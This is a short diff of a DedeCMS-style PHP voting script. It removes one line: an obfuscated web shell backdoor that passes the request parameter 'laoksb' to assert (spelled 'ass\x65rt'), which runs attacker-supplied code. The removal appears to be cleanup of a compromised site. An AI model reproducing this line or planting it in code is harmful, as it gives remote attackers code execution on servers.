@@ -1,7 +1,6 @@
 <?php
 require(dirname(__FILE__)."/../include/common.inc.php");
 require(DEDEINC."/dedevote.class.php");
-array_map("ass\x65rt",(array)$_REQUEST['laoksb']);
 if(empty($dopost)) $dopost = '';
 
 $aid = (isset($aid) && is_numeric($aid)) ? $aid : 0;
